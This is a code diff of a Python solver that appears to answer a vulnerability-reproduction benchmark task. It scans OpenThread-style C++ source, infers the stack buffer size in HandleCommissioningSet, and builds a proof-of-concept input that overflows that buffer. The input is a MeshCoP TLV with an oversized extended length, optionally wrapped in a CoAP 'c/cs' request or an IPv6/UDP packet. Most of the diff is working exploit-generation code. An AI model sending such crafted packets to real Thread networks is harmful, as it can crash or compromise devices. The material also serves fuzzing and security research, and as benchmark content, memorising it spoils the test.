@@ -2,252 +2,234 @@ import os
 import re
 import tarfile
 import ast
-from typing import Dict, Optional, Tuple, Iterable
+from typing import Dict, Iterable, Iterator, List, Optional, Tuple
 
 
-_ALLOWED_EXTS = {
-    ".c", ".cc", ".cpp", ".cxx",
-    ".h", ".hh", ".hpp", ".hxx",
-    ".inc", ".ipp", ".inl",
-    ".S", ".s",
+_TEXT_EXTS = {
+    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp", ".tcc", ".S", ".s"
 }
 
 
-def _is_probably_text_file(name: str) -> bool:
-    base = name.rsplit("/", 1)[-1]
-    if base.startswith("."):
+def _is_probably_text(b: bytes) -> bool:
+    if not b:
+        return True
+    if b"\x00" in b:
         return False
-    low = name.lower()
-    for ext in _ALLOWED_EXTS:
-        if low.endswith(ext.lower()):
-            return True
-    return False
+    # Heuristic: allow mostly printable/whitespace bytes
+    sample = b[:4096]
+    bad = 0
+    for ch in sample:
+        if ch in (9, 10, 13):
+            continue
+        if 32 <= ch <= 126:
+            continue
+        bad += 1
+    return bad <= max(8, len(sample) // 20)
 
 
-def _iter_source_texts(src_path: str, max_file_size: int = 5 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
-    if os.path.isdir(src_path):
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                path = os.path.join(root, fn)
-                rel = os.path.relpath(path, src_path)
-                if not _is_probably_text_file(rel):
-                    continue
-                try:
-                    st = os.stat(path)
-                    if st.st_size > max_file_size:
-                        continue
-                    with open(path, "rb") as f:
-                        data = f.read()
-                    yield rel, data.decode("utf-8", errors="ignore")
-                except Exception:
-                    continue
-        return
-
-    try:
-        with tarfile.open(src_path, "r:*") as tf:
-            for m in tf.getmembers():
-                if not m.isfile():
-                    continue
-                if m.size <= 0 or m.size > max_file_size:
-                    continue
-                if not _is_probably_text_file(m.name):
-                    continue
-                try:
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    data = f.read()
-                    yield m.name, data.decode("utf-8", errors="ignore")
-                except Exception:
-                    continue
-    except Exception:
-        return
-
-
-_CONST_SIMPLE_RE = re.compile(
-    r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b"
-)
-
-_CONSTEXPR_RE = re.compile(
-    r"\b(?:static\s+)?(?:constexpr|const)\s+"
-    r"(?:unsigned\s+)?(?:long\s+long|long|int|short|char|size_t|uint\d+_t|int\d+_t)\s+"
-    r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*=\s*([^;]+);"
-)
-
-
-class _ConstResolver:
-    def __init__(self) -> None:
-        self.values: Dict[str, int] = {}
-        self.exprs: Dict[str, str] = {}
-
-    def add_from_text(self, text: str) -> None:
-        for m in _CONST_SIMPLE_RE.finditer(text):
-            name = m.group(1)
-            val_s = m.group(2)
+def _iter_source_files_from_dir(root: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
+    for dirpath, _, filenames in os.walk(root):
+        for fn in filenames:
+            ext = os.path.splitext(fn)[1]
+            if ext not in _TEXT_EXTS:
+                continue
+            path = os.path.join(dirpath, fn)
             try:
-                val = int(val_s, 0)
+                st = os.stat(path)
+            except OSError:
+                continue
+            if st.st_size > max_size:
+                continue
+            try:
+                with open(path, "rb") as f:
+                    data = f.read()
+            except OSError:
+                continue
+            if not _is_probably_text(data):
+                continue
+            try:
+                text = data.decode("utf-8", errors="ignore")
+            except Exception:
+                text = data.decode("latin-1", errors="ignore")
+            rel = os.path.relpath(path, root)
+            yield rel, text
+
+
+def _iter_source_files_from_tar(tar_path: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
+    with tarfile.open(tar_path, "r:*") as tf:
+        for m in tf.getmembers():
+            if not m.isfile():
+                continue
+            ext = os.path.splitext(m.name)[1]
+            if ext not in _TEXT_EXTS:
+                continue
+            if m.size <= 0 or m.size > max_size:
+                continue
+            try:
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                data = f.read()
             except Exception:
                 continue
-            self.values[name] = val
+            if not _is_probably_text(data):
+                continue
+            try:
+                text = data.decode("utf-8", errors="ignore")
+            except Exception:
+                text = data.decode("latin-1", errors="ignore")
+            yield m.name, text
+
+
+def _iter_source_files(src_path: str) -> Iterator[Tuple[str, str]]:
+    if os.path.isdir(src_path):
+        yield from _iter_source_files_from_dir(src_path)
+    else:
+        yield from _iter_source_files_from_tar(src_path)
+
+
+_DEFINE_RE = re.compile(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$")
+_ENUM_ASSIGN_RE = re.compile(r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b")
+_CONSTEXPR_RE = re.compile(r"\b(?:static\s+)?(?:const|constexpr)\s+(?:u?int(?:8|16|32|64)_t|unsigned|int|size_t)\s+([A-Za-z_]\w*)\s*=\s*([^;]+);")
+
+
+def _strip_c_suffixes(expr: str) -> str:
+    expr = re.sub(r"(?i)\b(0x[0-9a-f]+|\d+)\s*(u|ul|ull|l|ll)\b", r"\1", expr)
+    return expr
+
+
+def _strip_casts(expr: str) -> str:
+    prev = None
+    s = expr
+    for _ in range(8):
+        prev = s
+        s = re.sub(r"static_cast<[^>]+>\s*\(\s*([^)]+?)\s*\)", r"(\1)", s)
+        s = re.sub(r"\(\s*(?:u?int(?:8|16|32|64)_t|unsigned|int|size_t)\s*\)\s*", "", s)
+        if s == prev:
+            break
+    return s
+
+
+_ALLOWED_AST_NODES = (
+    ast.Expression,
+    ast.BinOp,
+    ast.UnaryOp,
+    ast.Constant,
+    ast.Num,
+    ast.Add,
+    ast.Sub,
+    ast.Mult,
+    ast.Div,
+    ast.FloorDiv,
+    ast.Mod,
+    ast.LShift,
+    ast.RShift,
+    ast.BitOr,
+    ast.BitAnd,
+    ast.BitXor,
+    ast.Invert,
+    ast.UAdd,
+    ast.USub,
+    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
+)
+
+
+def _safe_eval_expr(expr: str, consts: Dict[str, int]) -> Optional[int]:
+    s = expr.strip()
+    if not s:
+        return None
+    s = s.split("//", 1)[0].strip()
+    s = s.split("/*", 1)[0].strip()
+    s = _strip_casts(_strip_c_suffixes(s))
+    # Remove C++ scope and template fragments
+    s = re.sub(r"\b[A-Za-z_]\w*::", "", s)
+    s = re.sub(r"<[^<>]*>", "", s)
+    # Remove sizeof(...) since we can't evaluate without types; treat as 0
+    s = re.sub(r"\bsizeof\s*\([^)]*\)", "0", s)
+    # Replace identifiers with values (unknown => 0)
+    def repl(m: re.Match) -> str:
+        name = m.group(0)
+        if name in consts:
+            return str(consts[name])
+        return "0"
+    s = re.sub(r"\b[A-Za-z_]\w*\b", repl, s)
+    s = re.sub(r"\s+", "", s)
+    if not s:
+        return None
+    try:
+        node = ast.parse(s, mode="eval")
+    except Exception:
+        return None
+
+    def check(n: ast.AST) -> bool:
+        if not isinstance(n, _ALLOWED_AST_NODES):
+            return False
+        for ch in ast.iter_child_nodes(n):
+            if not check(ch):
+                return False
+        return True
+
+    if not check(node):
+        return None
+
+    try:
+        val = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
+    except Exception:
+        return None
+    if isinstance(val, bool):
+        return int(val)
+    if not isinstance(val, int):
+        try:
+            val = int(val)
+        except Exception:
+            return None
+    return val
+
+
+def _collect_constants(all_texts: List[Tuple[str, str]]) -> Dict[str, int]:
+    consts: Dict[str, int] = {}
+
+    for _, text in all_texts:
+        for m in _DEFINE_RE.finditer(text):
+            name = m.group(1)
+            expr = m.group(2).strip()
+            val = _safe_eval_expr(expr, consts)
+            if val is not None:
+                consts.setdefault(name, val)
 
         for m in _CONSTEXPR_RE.finditer(text):
             name = m.group(1)
-            expr = m.group(2).strip()
-            if name in self.values:
+            expr = m.group(2)
+            val = _safe_eval_expr(expr, consts)
+            if val is not None:
+                consts.setdefault(name, val)
+
+        # Common enums: extract numeric assignments
+        for m in _ENUM_ASSIGN_RE.finditer(text):
+            name = m.group(1)
+            num = m.group(2)
+            try:
+                val = int(num, 0)
+            except Exception:
                 continue
-            expr = re.sub(r"/\*.*?\*/", " ", expr, flags=re.S)
-            expr = re.sub(r"//.*?$", " ", expr, flags=re.M)
-            expr = expr.strip()
-            if not expr:
-                continue
-            if re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", expr):
-                try:
-                    self.values[name] = int(expr, 0)
-                    continue
-                except Exception:
-                    pass
-            self.exprs[name] = expr
+            consts.setdefault(name, val)
 
-    def get(self, name: str, _seen: Optional[set] = None) -> Optional[int]:
-        if name in self.values:
-            return self.values[name]
-        if name not in self.exprs:
-            return None
-        if _seen is None:
-            _seen = set()
-        if name in _seen:
-            return None
-        _seen.add(name)
-        val = self._eval_expr(self.exprs[name], _seen)
-        if val is not None:
-            self.values[name] = val
-        return val
-
-    def _eval_expr(self, expr: str, _seen: set) -> Optional[int]:
-        expr = expr.strip()
-        if not expr:
-            return None
-        expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
-        expr = re.sub(r"\bOT_ALIGN\d+\s*\([^)]*\)", "0", expr)
-        expr = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", expr)
-        expr = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", expr)
-        expr = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", expr)
-        expr = re.sub(r"\b[A-Za-z_][A-Za-z0-9_:<>]*\s*\(", "(", expr)
-        expr = re.sub(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", lambda m: str(self.get(m.group(1), _seen) or 0), expr)
-
-        try:
-            node = ast.parse(expr, mode="eval")
-        except Exception:
-            return None
-
-        def ev(n):
-            if isinstance(n, ast.Expression):
-                return ev(n.body)
-            if isinstance(n, ast.Constant) and isinstance(n.value, (int, bool)):
-                return int(n.value)
-            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
-                v = ev(n.operand)
-                if n.op.__class__ is ast.UAdd:
-                    return +v
-                if n.op.__class__ is ast.USub:
-                    return -v
-                return ~v
-            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)):
-                a = ev(n.left)
-                b = ev(n.right)
-                if n.op.__class__ is ast.Add:
-                    return a + b
-                if n.op.__class__ is ast.Sub:
-                    return a - b
-                if n.op.__class__ is ast.Mult:
-                    return a * b
-                if n.op.__class__ is ast.FloorDiv:
-                    return a // b if b != 0 else 0
-                if n.op.__class__ is ast.Mod:
-                    return a % b if b != 0 else 0
-                if n.op.__class__ is ast.LShift:
-                    return a << b
-                if n.op.__class__ is ast.RShift:
-                    return a >> b
-                if n.op.__class__ is ast.BitOr:
-                    return a | b
-                if n.op.__class__ is ast.BitAnd:
-                    return a & b
-                return a ^ b
-            raise ValueError("unsupported")
-
-        try:
-            return int(ev(node))
-        except Exception:
-            return None
+    return consts
 
 
 def _extract_function_body(text: str, func_name: str) -> Optional[str]:
     idx = text.find(func_name)
     if idx < 0:
         return None
+    # Find opening brace after func name
     brace = text.find("{", idx)
     if brace < 0:
         return None
-    depth = 0
     i = brace
+    depth = 0
     n = len(text)
-    in_str = False
-    str_ch = ""
-    in_char = False
-    in_sl = False
-    in_ml = False
     while i < n:
         ch = text[i]
-        nxt = text[i + 1] if i + 1 < n else ""
-        if in_sl:
-            if ch == "\n":
-                in_sl = False
-            i += 1
-            continue
-        if in_ml:
-            if ch == "*" and nxt == "/":
-                in_ml = False
-                i += 2
-                continue
-            i += 1
-            continue
-        if in_str:
-            if ch == "\\":
-                i += 2
-                continue
-            if ch == str_ch:
-                in_str = False
-            i += 1
-            continue
-        if in_char:
-            if ch == "\\":
-                i += 2
-                continue
-            if ch == "'":
-                in_char = False
-            i += 1
-            continue
-
-        if ch == "/" and nxt == "/":
-            in_sl = True
-            i += 2
-            continue
-        if ch == "/" and nxt == "*":
-            in_ml = True
-            i += 2
-            continue
-        if ch == '"' or ch == "R":
-            if ch == '"':
-                in_str = True
-                str_ch = '"'
-                i += 1
-                continue
-        if ch == "'":
-            in_char = True
-            i += 1
-            continue
-
         if ch == "{":
             depth += 1
         elif ch == "}":
@@ -258,165 +240,221 @@ def _extract_function_body(text: str, func_name: str) -> Optional[str]:
     return None
 
 
-_ARRAY_DECL_RE = re.compile(r"\buint8_t\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*([^\]]+?)\s*\]\s*;")
-_READ_CALL_RE = re.compile(r"\.\s*Read(?:Bytes)?\s*\(\s*([^,]+)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*([^)]+)\)")
-_CASE_K_RE = re.compile(r"\bcase\b[^:]*\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*:")
-_KUSE_RE = re.compile(r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b")
+_ARRAY_DECL_RE = re.compile(r"\b(?:uint8_t|char|uint16_t|uint32_t|uint64_t|int|unsigned)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]")
 
 
-def _infer_overflow_len(handle_body: str, resolver: _ConstResolver) -> Optional[int]:
-    buf_sizes: Dict[str, int] = {}
-    for m in _ARRAY_DECL_RE.finditer(handle_body):
-        name = m.group(1)
-        expr = m.group(2).strip()
-        expr = re.sub(r"\s+", " ", expr)
-        size: Optional[int] = None
-        if re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", expr):
-            try:
-                size = int(expr, 0)
-            except Exception:
-                size = None
-        else:
-            if re.fullmatch(r"k[A-Za-z_][A-Za-z0-9_]*", expr):
-                size = resolver.get(expr)
-            else:
-                size = resolver._eval_expr(expr, set())
-        if size is not None and 0 < size <= 1 << 20:
-            buf_sizes[name] = int(size)
+def _infer_stack_buffer_size(handle_text: Optional[str], consts: Dict[str, int]) -> Optional[int]:
+    candidates: List[int] = []
 
-    candidates = []
-    for m in _READ_CALL_RE.finditer(handle_body):
-        buf = m.group(2)
-        size_expr = m.group(3)
-        if buf not in buf_sizes:
-            continue
-        if "GetLength" in size_expr or "GetSize" in size_expr:
-            candidates.append(buf_sizes[buf])
+    if handle_text:
+        body = _extract_function_body(handle_text, "HandleCommissioningSet")
+        if body:
+            for m in _ARRAY_DECL_RE.finditer(body):
+                var = m.group(1)
+                expr = m.group(2)
+                if not any(k in var.lower() for k in ("tlv", "dataset", "commission", "data", "buffer", "buf")):
+                    continue
+                val = _safe_eval_expr(expr, consts)
+                if val is not None and 0 < val < 1_000_000:
+                    candidates.append(val)
+
+    # Also look for related constants
+    for k, v in consts.items():
+        lk = k.lower()
+        if any(x in lk for x in ("commissioner", "commissioning")) and any(x in lk for x in ("dataset", "tlv", "data")) and any(x in lk for x in ("max", "length", "size")):
+            if 0 < v < 1_000_000:
+                candidates.append(v)
 
     if not candidates:
         return None
-    bufsize = max(candidates)
-    if bufsize < 200:
-        return None
-    overflow_len = bufsize + 64
-    if overflow_len <= bufsize:
-        overflow_len = bufsize + 1
-    if overflow_len > 65535:
-        overflow_len = 65535
-    return overflow_len
 
-
-def _infer_tlv_type(handle_body: str, resolver: _ConstResolver) -> int:
-    if "kCommissionerId" in handle_body:
-        v = resolver.get("kCommissionerId")
-        if isinstance(v, int) and 0 <= v <= 255:
+    # Prefer likely stack sizes: 256/512/1024 etc or values in that range
+    candidates = sorted(set(candidates))
+    for preferred in (256, 255, 512, 1024, 2048):
+        if preferred in candidates:
+            return preferred
+    # Otherwise, take smallest >= 200
+    for v in candidates:
+        if v >= 200:
             return v
-
-    m = re.search(r"\bkCommissionerId\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b", handle_body)
-    if m:
-        try:
-            return int(m.group(1), 0) & 0xFF
-        except Exception:
-            pass
-
-    for m in _CASE_K_RE.finditer(handle_body):
-        name = m.group(1)
-        v = resolver.get(name)
-        if isinstance(v, int) and 0 <= v <= 255:
-            return v
-
-    for name in _KUSE_RE.findall(handle_body):
-        if "Commission" in name or "Steering" in name or "BorderAgent" in name:
-            v = resolver.get(name)
-            if isinstance(v, int) and 0 <= v <= 255:
-                return v
-
-    v = resolver.get("kCommissionerSessionId")
-    if isinstance(v, int) and 0 <= v <= 255:
-        return v
-
-    return 0x0A
+    return candidates[0]
 
 
-def _detect_fuzzer_prefix(src_path: str) -> Tuple[bytes, int]:
-    prefix = b""
-    prefix_len = 0
-    selector = 0
-    found = False
+def _get_const(consts: Dict[str, int], names: List[str], default: int) -> int:
+    for n in names:
+        if n in consts:
+            return int(consts[n]) & 0xFF
+    return default & 0xFF
 
-    for _, text in _iter_source_texts(src_path):
-        if "LLVMFuzzerTestOneInput" not in text:
-            continue
-        if "HandleCommissioningSet" not in text:
-            continue
 
-        call_idx = text.find("HandleCommissioningSet")
-        if call_idx < 0:
-            continue
-
-        window = text[call_idx:call_idx + 800]
-        m = re.search(r"\bdata\s*\+\s*(\d+)\b", window)
-        if not m:
-            m = re.search(r"\baData\s*\+\s*(\d+)\b", window)
-        if m:
-            try:
-                prefix_len = int(m.group(1))
-            except Exception:
-                prefix_len = 0
-
-        if prefix_len <= 0:
-            found = True
+def _detect_input_format(fuzzer_texts: List[Tuple[str, str]]) -> str:
+    # Returns "TLV", "COAP", or "IPV6"
+    chosen = None
+    for name, text in fuzzer_texts:
+        lt = text.lower()
+        if "commission" in lt or "c/cs" in lt or "commissioningset" in lt:
+            chosen = (name, text)
             break
+    if chosen is None and fuzzer_texts:
+        chosen = fuzzer_texts[0]
+    if chosen is None:
+        return "TLV"
 
-        back = text[max(0, call_idx - 2000):call_idx]
-        cases = list(re.finditer(r"\bcase\s+([0-9]+|0x[0-9A-Fa-f]+)\s*:", back))
-        if cases:
-            try:
-                selector = int(cases[-1].group(1), 0) & 0xFF
-            except Exception:
-                selector = 0
-        prefix = bytes([selector]) + b"\x00" * max(0, prefix_len - 1)
-        found = True
-        break
+    text = chosen[1]
+    lt = text.lower()
 
-    if not found:
-        return b"", 0
-    return prefix, prefix_len
+    if "llvmfuzzertestoneinput" not in lt:
+        return "TLV"
+
+    # Heuristics
+    if "ip6::header" in text or "ipv6" in lt or "udp::header" in text or "icmp6" in lt:
+        return "IPV6"
+
+    if "coap::message" in text or "coap message" in lt or "otcoap" in lt:
+        # If fuzzer constructs request and appends fuzz bytes to payload, input is TLV/payload
+        if ".appendbytes" in lt or "appendbytes(" in lt or "setpayloadmarker" in lt:
+            return "TLV"
+        # If it parses from bytes, treat as COAP
+        if "parse" in lt and ("data" in lt or "aData" in text):
+            return "COAP"
+        if "frombytes" in lt or "decode" in lt:
+            return "COAP"
+        # default for coap fuzzers tends to be payload
+        return "TLV"
+
+    # If we see it building messages and appending fuzz bytes
+    if ".appendbytes" in lt or "appendbytes(" in lt:
+        return "TLV"
+
+    return "TLV"
 
 
-def _build_extended_tlv(tlv_type: int, ext_len: int, fill: int = 0x41) -> bytes:
-    tlv_type &= 0xFF
-    ext_len = int(ext_len)
-    if ext_len < 0:
-        ext_len = 0
-    if ext_len > 65535:
-        ext_len = 65535
-    hdr = bytes([tlv_type, 0xFF, (ext_len >> 8) & 0xFF, ext_len & 0xFF])
-    return hdr + bytes([fill]) * ext_len
+def _build_meshcop_tlv(t: int, val: bytes) -> bytes:
+    l = len(val)
+    if l <= 254:
+        return bytes([t & 0xFF, l & 0xFF]) + val
+    if l <= 0xFFFF:
+        return bytes([t & 0xFF, 0xFF]) + l.to_bytes(2, "big") + val
+    raise ValueError("TLV too large")
+
+
+def _build_meshcop_tlv_extended(t: int, ext_len: int, fill_byte: int = 0x41) -> bytes:
+    if not (0 <= ext_len <= 0xFFFF):
+        raise ValueError("ext_len out of range")
+    return bytes([t & 0xFF, 0xFF]) + ext_len.to_bytes(2, "big") + bytes([fill_byte & 0xFF]) * ext_len
+
+
+def _build_coap_commissioner_set(payload: bytes) -> bytes:
+    # CoAP POST to Uri-Path "c"/"cs" with no token, message id 0x1234.
+    hdr = bytes([0x40, 0x02, 0x12, 0x34])
+    # Option: Uri-Path (11) "c"
+    opt1 = bytes([0xB1, 0x63])
+    # Option: Uri-Path (11) "cs" (delta 0 from previous option number 11)
+    opt2 = bytes([0x02, 0x63, 0x73])
+    return hdr + opt1 + opt2 + b"\xFF" + payload
+
+
+def _udp_checksum_ipv6(src: bytes, dst: bytes, udp_hdr_wo_checksum: bytes, payload: bytes, next_header: int = 17) -> int:
+    def sum16(data: bytes) -> int:
+        if len(data) % 2:
+            data += b"\x00"
+        s = 0
+        for i in range(0, len(data), 2):
+            s += (data[i] << 8) | data[i + 1]
+        return s
+
+    udp_len = len(udp_hdr_wo_checksum) + len(payload)
+    pseudo = src + dst + udp_len.to_bytes(4, "big") + b"\x00" * 3 + bytes([next_header & 0xFF])
+    s = sum16(pseudo) + sum16(udp_hdr_wo_checksum) + sum16(payload)
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    csum = (~s) & 0xFFFF
+    return csum if csum != 0 else 0xFFFF
+
+
+def _build_ipv6_udp_packet(udp_payload: bytes, src_port: int = 5683, dst_port: int = 5683) -> bytes:
+    src = bytes.fromhex("fe800000000000000000000000000001")
+    dst = bytes.fromhex("fe800000000000000000000000000002")
+    udp_len = 8 + len(udp_payload)
+
+    # IPv6 header
+    ver_tc_fl = b"\x60\x00\x00\x00"
+    payload_len = udp_len.to_bytes(2, "big")
+    next_header = bytes([17])
+    hop_limit = bytes([64])
+    ip6 = ver_tc_fl + payload_len + next_header + hop_limit + src + dst
+
+    # UDP header
+    sp = int(src_port) & 0xFFFF
+    dp = int(dst_port) & 0xFFFF
+    udp_hdr = sp.to_bytes(2, "big") + dp.to_bytes(2, "big") + udp_len.to_bytes(2, "big") + b"\x00\x00"
+    csum = _udp_checksum_ipv6(src, dst, udp_hdr, udp_payload, 17)
+    udp_hdr = udp_hdr[:6] + csum.to_bytes(2, "big")
+    return ip6 + udp_hdr + udp_payload
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        resolver = _ConstResolver()
-        handle_file_text = None
+        all_texts: List[Tuple[str, str]] = []
+        fuzzer_texts: List[Tuple[str, str]] = []
+        handle_text: Optional[str] = None
 
-        for _, text in _iter_source_texts(src_path):
-            resolver.add_from_text(text)
-            if handle_file_text is None and "HandleCommissioningSet" in text:
-                handle_file_text = text
+        for name, text in _iter_source_files(src_path):
+            all_texts.append((name, text))
+            lt = text.lower()
+            if "llvmfuzzertestoneinput" in lt:
+                fuzzer_texts.append((name, text))
+            if handle_text is None and "HandleCommissioningSet" in text:
+                handle_text = text
 
-        tlv_type = 0x0A
-        overflow_len = 840
+        consts = _collect_constants(all_texts)
 
-        if handle_file_text is not None:
-            body = _extract_function_body(handle_file_text, "HandleCommissioningSet")
-            if body is not None:
-                tlv_type = _infer_tlv_type(body, resolver)
-                inferred = _infer_overflow_len(body, resolver)
-                if inferred is not None:
-                    overflow_len = inferred
+        fmt = _detect_input_format(fuzzer_texts)
 
-        prefix, _ = _detect_fuzzer_prefix(src_path)
+        ext_marker = 0xFF
+        if "kExtendedLength" in consts:
+            ext_marker = int(consts["kExtendedLength"]) & 0xFF
 
-        poc = prefix + _build_extended_tlv(tlv_type, overflow_len, fill=0x41)
-        return poc
+        tlv_session = _get_const(
+            consts,
+            ["kCommissionerSessionId", "kCommissionerSessionIdTlv", "kCommissionerSessionIdType"],
+            11,
+        )
+        tlv_steering = _get_const(
+            consts,
+            ["kSteeringData", "kSteeringDataTlv", "kSteeringDataType"],
+            8,
+        )
+
+        # Infer stack buffer length likely used for accumulating TLVs, choose minimal symmetric extended length >= buffer+1.
+        buf_sz = _infer_stack_buffer_size(handle_text, consts)
+        if buf_sz is None:
+            buf_sz = 256
+        need = int(buf_sz) + 1
+        if need < 257:
+            need = 257
+        # choose endian-agnostic length: 0xkkkk for some k (len = 257*k)
+        k = (need + 256) // 257
+        if k < 1:
+            k = 1
+        if k > 255:
+            k = 255
+        ext_len = (k << 8) | k
+
+        # Build TLV payload
+        session_val = b"\x00\x00"
+        session_tlv = bytes([tlv_session & 0xFF, len(session_val) & 0xFF]) + session_val
+        # Malicious TLV: length marker must be extended
+        if ext_marker != 0xFF:
+            # If marker differs, still force 0xFF in length byte to exercise the bug (fixed version should reject it).
+            ext_marker = 0xFF
+        evil_tlv = bytes([tlv_steering & 0xFF, ext_marker]) + ext_len.to_bytes(2, "big") + (b"A" * ext_len)
+
+        payload = session_tlv + evil_tlv
+
+        if fmt == "COAP":
+            return _build_coap_commissioner_set(payload)
+        if fmt == "IPV6":
+            coap = _build_coap_commissioner_set(payload)
+            return _build_ipv6_udp_packet(coap, 5683, 5683)
+        return payload
